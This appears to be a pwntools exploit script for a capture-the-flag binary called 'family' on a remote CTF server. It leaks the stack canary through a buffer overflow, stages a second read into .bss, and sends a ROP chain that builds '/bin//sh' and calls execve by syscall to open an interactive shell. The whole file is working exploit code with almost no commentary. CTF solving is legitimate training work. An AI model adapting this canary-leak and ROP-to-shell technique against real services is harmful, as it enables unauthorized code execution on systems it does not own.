from pwn import *

r = remote('ctf.adl.tw', 11006)
# r = process('../binary/family')

'''set up'''
elf = ELF('../binary/family')
bss_buf = elf.bss() + 0x500
data_buf_addr = 0x6bd100
pop_rsi = 0x0000000000410713
read_addr = 0x400C80
pop_rbp = 0x0000000000400aa8
pop_rdx = 0x000000000044a365

'''exploit'''

r.recvuntil("Where is my daddy QQ\n")
r.send(b'A' * 24 + b'\n')
all_raw = r.recvuntil('Co')[25:-2]
addr = int.from_bytes(all_raw, byteorder='little')
print(hex(addr))
print('canary:', hex(addr)[8:] + '00')
canary = int(hex(addr)[8:] + '00', 16)
payload = b'A' * 24 + p64(canary) + p64(
    bss_buf + 8) + p64(pop_rsi) + p64(bss_buf) + p64(pop_rdx) + p64(0x01000) + p64(
    read_addr)
r.send(payload)

'''rop chain'''
rop_chain = p64(0x0000000000410713)  # pop rsi ; ret
rop_chain += p64(0x00000000006ba0e0)  # @ .data
rop_chain += p64(0x000000000044a30c)  # pop rax ; ret
rop_chain += b'/bin//sh'
rop_chain += p64(0x00000000004801d1)  # mov qword ptr [rsi], rax ; ret
rop_chain += p64(0x0000000000410713)  # pop rsi ; ret
rop_chain += p64(0x00000000006ba0e8)  # @ .data + 8
rop_chain += p64(0x00000000004452b0)  # xor rax, rax ; ret
rop_chain += p64(0x00000000004801d1)  # mov qword ptr [rsi], rax ; ret
rop_chain += p64(0x0000000000400696)  # pop rdi ; ret
rop_chain += p64(0x00000000006ba0e0)  # @ .data
rop_chain += p64(0x0000000000410713)  # pop rsi ; ret
rop_chain += p64(0x00000000006ba0e8)  # @ .data + 8
rop_chain += p64(0x000000000044a365)  # pop rdx ; ret
rop_chain += p64(0x00000000006ba0e8)  # @ .data + 8
rop_chain += p64(0x00000000004452b0)  # xor rax, rax ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x0000000000475660)  # add rax, 1 ; ret
rop_chain += p64(0x000000000040132c)  # syscall
# rop_chain = p64(0x000000000044a30c)  # pop rax ; ret
# rop_chain += p64(0x3b)
# rop_chain += p64(0x0000000000400696)  # pop rdi ; ret
# rop_chain += b'/bin//sh'
# rop_chain += p64(0x0000000000410713)  # pop rsi ; ret
# rop_chain += p64(0)
# rop_chain += p64(0x000000000044a365)  # pop rdx ; ret
# rop_chain += p64(0)
# rop_chain += p64(0x000000000040132c)  # syscall
# gdb.attach(r)
r.send(p64(canary) + b'A' * 8 + rop_chain)
'''
     cannary      +     A*8   + rop chain
(   buf start(rbp-8)   ) +     rbp   
'''
r.interactive()
